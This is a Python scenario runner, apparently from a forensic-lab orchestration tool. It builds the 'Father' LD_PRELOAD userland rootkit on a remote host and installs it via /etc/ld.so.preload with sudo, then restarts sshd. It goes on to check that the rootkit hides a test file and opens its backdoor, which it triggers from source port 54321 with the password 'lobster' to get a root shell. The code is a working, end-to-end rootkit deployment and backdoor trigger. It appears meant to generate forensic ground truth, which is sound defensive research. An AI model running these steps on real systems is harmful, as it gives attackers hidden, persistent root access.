"""Explicit runner for the Father LD_PRELOAD scenario."""

from __future__ import annotations

import re
import socket
import time
from pathlib import Path

import yaml

from orchestrator.core import console
from orchestrator.core.provenance import file_sha256
from orchestrator.core.ssh_client import SSHClient, TerminalCommandResult
from scenarios.command_log import append_record, log_command, utc_now


SCENARIO_ID = "userland_father_ldpreload"
ROOT = Path(__file__).resolve().parent
ARCHIVE = ROOT / "files/father-upstream-4eb2712.tar"
LOCK = ROOT / "father.lock.yml"

REMOTE_ROOT = "/tmp/forensic-lab/father_ldpreload"
UPLOAD_PATH = "/tmp/father-upstream-4eb2712.tar"
INSTALLED_LIBRARY = "/usr/local/lib/forensic-lab/father/selinux.so.3"
PRELOAD_CONFIG = "/etc/ld.so.preload"
PROCESS_DURATION_SECONDS = 1800
SOURCE_PORT = 54321
SHELL_PASSWORD = b"lobster\0"
HIDDEN_FILE_NAME = "__malicious_file"
LIST_HIDDEN_DIR = 'ls -la -- "$hidden_dir"'

COMMAND_GROUPS = (
    (
        "prepare and build",
        (
            f'root={REMOTE_ROOT}; '
            'source="$root/Father-4eb2712caf612a7dc55fd4f34ff5c72b74c7c332"; '
            'hidden_dir="$root/probe"',
            'mkdir -p "$hidden_dir"',
            f'tar -xf {UPLOAD_PATH} -C "$root"',
            "sed -i "
            "-e 's|^#define STRING .*|#define STRING \"__malicious_\"|' "
            "-e 's|^#define PRELOAD .*|#define PRELOAD \"father_calibration_nohide\"|' "
            f"-e 's|^#define INSTALL_LOCATION .*|#define INSTALL_LOCATION \"{INSTALLED_LIBRARY}\"|' "
            '"$source/src/config.h"',
            'cd "$source" && make father',
        ),
    ),
    (
        "install and activate",
        (
            f'sudo -n install -D -m 0644 "$source/rk.so" {INSTALLED_LIBRARY}',
            f'touch "$hidden_dir/{HIDDEN_FILE_NAME}"',
            LIST_HIDDEN_DIR,
            f"printf '%s\\n' {INSTALLED_LIBRARY} | sudo -n tee {PRELOAD_CONFIG}",
            "pids=(); for _ in 1 2 3; do "
            "pids+=(\"$(sudo -n /bin/sh -c "
            "'/usr/bin/setsid /usr/bin/sleep \"$1\" </dev/null >/dev/null 2>&1 & echo $!' "
            f"sh {PROCESS_DURATION_SECONDS})\"); done",
            "sudo -n systemctl restart ssh.service",
        ),
    ),
    (
        "validate treatment",
        (
            LIST_HIDDEN_DIR,
            "sleep 1; all_mapped=true; for pid in \"${pids[@]}\"; do "
            f'sudo -n grep -Fq {INSTALLED_LIBRARY} "/proc/$pid/maps" '
            '|| all_mapped=false; done; '
            '[[ "${#pids[@]}" -eq 3 && "$all_mapped" == true ]]',
            'sshd_pid="$(sudo -n systemctl show --property=MainPID --value ssh.service)"',
            "printf 'FATHER_RESULT pids=%s,%s,%s sshd_pid=%s\\n' "
            '"${pids[0]}" "${pids[1]}" "${pids[2]}" "$sshd_pid"',
        ),
    ),
)


def run_father(
    ssh: SSHClient,
    transcript_path: Path,
    response_path: Path,
    *,
    command_log_path: Path,
    run_id: str,
) -> dict:
    """Run Father visibly in Bash, then validate its native accept-hook shell."""
    transcript_path.touch()
    response_path.touch()
    console.step_header(COMMAND_GROUPS[0][0])
    source = _verify_source(command_log_path, run_id)
    _upload_archive(ssh, command_log_path, run_id)

    terminal = ssh.open_terminal()
    results: list[TerminalCommandResult] = []
    command_index = 0
    try:
        with terminal:
            for group_index, (label, commands) in enumerate(COMMAND_GROUPS):
                if group_index:
                    console.step_header(label)
                for command in commands:
                    command_index += 1
                    started_at = utc_now()
                    try:
                        result = terminal.run(command, timeout=180)
                    except Exception as exc:
                        log_command(
                            command_log_path,
                            run_id,
                            SCENARIO_ID,
                            command_index,
                            command,
                            started_at,
                            status="failure",
                            error=str(exc),
                        )
                        raise
                    results.append(result)
                    status = "success" if result.exit_code == 0 else "failure"
                    log_command(
                        command_log_path,
                        run_id,
                        SCENARIO_ID,
                        command_index,
                        command,
                        started_at,
                        status=status,
                        result=result,
                    )
                    if result.exit_code != 0:
                        raise RuntimeError(
                            f"Father command exited {result.exit_code}: {command}"
                        )
    finally:
        transcript_path.write_text(terminal.transcript, encoding="utf-8")

    listings = [
        result.combined_output
        for result in results
        if result.command == LIST_HIDDEN_DIR
    ]
    if (
        len(listings) != 2
        or HIDDEN_FILE_NAME not in listings[0]
        or HIDDEN_FILE_NAME in listings[1]
    ):
        raise RuntimeError("Father did not hide the controlled file as expected")

    match = re.search(
        r"FATHER_RESULT pids=(\d+),(\d+),(\d+) sshd_pid=(\d+)",
        results[-1].combined_output,
    )
    if match is None:
        raise RuntimeError("Father did not return the validated process IDs")

    identity = _validate_backdoor(
        ssh,
        response_path,
        command_log_path=command_log_path,
        run_id=run_id,
    )
    return {
        "source": source,
        "installed_library_path": INSTALLED_LIBRARY,
        "preload_config_path": PRELOAD_CONFIG,
        "affected_pids": [int(value) for value in match.groups()[:3]],
        "sshd_pid": int(match.group(4)),
        "hidden_file_path": f"{REMOTE_ROOT}/probe/__malicious_file",
        "file_hiding_passed": True,
        "father_backdoor_passed": True,
        "backdoor_identity": identity,
        "trigger_source_port": SOURCE_PORT,
        "listener_service": "sshd",
        "listener_port": ssh.port,
        "backdoor_response_path": response_path.name,
    }


def _verify_source(command_log_path: Path, run_id: str) -> dict:
    started_at = utc_now()
    try:
        lock = yaml.safe_load(LOCK.read_text(encoding="utf-8"))
        archive_hash = file_sha256(ARCHIVE)
        expected_hash = lock["retrieval"]["archive_sha256"]
        if archive_hash != expected_hash:
            raise RuntimeError(
                "Father archive SHA-256 mismatch: "
                f"expected {expected_hash}, got {archive_hash}"
            )
    except Exception as exc:
        append_record(
            command_log_path,
            {
                "run_id": run_id,
                "scenario_id": SCENARIO_ID,
                "step_id": "verify_father_source",
                "type": "host_verification",
                "status": "failure",
                "started_at": started_at,
                "ended_at": utc_now(),
                "error": str(exc),
            },
        )
        raise

    source = {
        "repository": lock["upstream"]["url"],
        "commit": lock["upstream"]["pinned_commit"],
        "archive_sha256": archive_hash,
    }
    append_record(
        command_log_path,
        {
            "run_id": run_id,
            "scenario_id": SCENARIO_ID,
            "step_id": "verify_father_source",
            "type": "host_verification",
            "status": "success",
            "source": source,
            "started_at": started_at,
            "ended_at": utc_now(),
        },
    )
    console.ok(f"Father source verified: {archive_hash}")
    return source


def _upload_archive(
    ssh: SSHClient,
    command_log_path: Path,
    run_id: str,
) -> None:
    started_at = utc_now()
    console.step(f"Uploading {ARCHIVE.name} to {UPLOAD_PATH}...")
    try:
        ssh.put(ARCHIVE, UPLOAD_PATH)
    except Exception as exc:
        append_record(
            command_log_path,
            {
                "run_id": run_id,
                "scenario_id": SCENARIO_ID,
                "step_id": "upload_father_source",
                "type": "upload",
                "source": str(ARCHIVE),
                "destination": UPLOAD_PATH,
                "status": "failure",
                "started_at": started_at,
                "ended_at": utc_now(),
                "error": str(exc),
            },
        )
        raise
    append_record(
        command_log_path,
        {
            "run_id": run_id,
            "scenario_id": SCENARIO_ID,
            "step_id": "upload_father_source",
            "type": "upload",
            "source": str(ARCHIVE),
            "destination": UPLOAD_PATH,
            "status": "success",
            "started_at": started_at,
            "ended_at": utc_now(),
        },
    )


def _validate_backdoor(
    ssh: SSHClient,
    response_path: Path,
    *,
    command_log_path: Path,
    run_id: str,
) -> str:
    started_at = utc_now()
    response = bytearray()
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    deadline = time.monotonic() + 12
    console.step(
        f"Connecting to {ssh.host}:{ssh.port} from Father trigger port "
        f"{SOURCE_PORT}..."
    )
    try:
        client.bind(("", SOURCE_PORT))
        client.settimeout(max(0.001, deadline - time.monotonic()))
        client.connect((ssh.host, ssh.port))

        while b"AUTHENTICATE: " not in response and time.monotonic() < deadline:
            client.settimeout(max(0.001, deadline - time.monotonic()))
            chunk = client.recv(4096)
            if not chunk:
                break
            response.extend(chunk)
        if b"AUTHENTICATE: " not in response:
            raise RuntimeError("Father authentication prompt was not received")

        client.sendall(SHELL_PASSWORD)
        authenticated_size = len(response)
        while len(response) == authenticated_size and time.monotonic() < deadline:
            client.settimeout(max(0.001, deadline - time.monotonic()))
            chunk = client.recv(4096)
            if not chunk:
                break
            response.extend(chunk)
        if len(response) == authenticated_size:
            raise RuntimeError("Father did not accept the backdoor password")

        client.sendall(b"id\n")
        while (
            (b"uid=0(root)" not in response or b"gid=1337" not in response)
            and time.monotonic() < deadline
        ):
            client.settimeout(max(0.001, deadline - time.monotonic()))
            chunk = client.recv(4096)
            if not chunk:
                break
            response.extend(chunk)
        if b"uid=0(root)" not in response or b"gid=1337" not in response:
            raise RuntimeError("Father shell did not return the expected root identity")
    except (OSError, RuntimeError) as exc:
        response_path.write_bytes(response)
        append_record(
            command_log_path,
            {
                "run_id": run_id,
                "scenario_id": SCENARIO_ID,
                "step_id": "validate_father_backdoor",
                "type": "host_socket",
                "command": "id",
                "trigger_source_port": SOURCE_PORT,
                "destination_host": ssh.host,
                "destination_port": ssh.port,
                "response_path": response_path.name,
                "response_excerpt": response.decode(errors="replace")[-1200:],
                "status": "failure",
                "started_at": started_at,
                "ended_at": utc_now(),
                "error": str(exc),
            },
        )
        raise RuntimeError(f"Father backdoor validation failed: {exc}") from exc
    finally:
        client.close()

    response_path.write_bytes(response)
    response_text = response.decode(errors="replace")
    identity = next(
        line.strip()
        for line in response_text.splitlines()
        if "uid=0(root)" in line and "gid=1337" in line
    ).removeprefix("\x1b[0m")
    append_record(
        command_log_path,
        {
            "run_id": run_id,
            "scenario_id": SCENARIO_ID,
            "step_id": "validate_father_backdoor",
            "type": "host_socket",
            "command": "id",
            "trigger_source_port": SOURCE_PORT,
            "destination_host": ssh.host,
            "destination_port": ssh.port,
            "response_path": response_path.name,
            "response_excerpt": response_text[-1200:],
            "identity": identity,
            "status": "success",
            "started_at": started_at,
            "ended_at": utc_now(),
        },
    )
    console.ok(f"Father shell response: {identity}")
    console.info(f"Father shell transcript: {response_path.name}")
    return identity
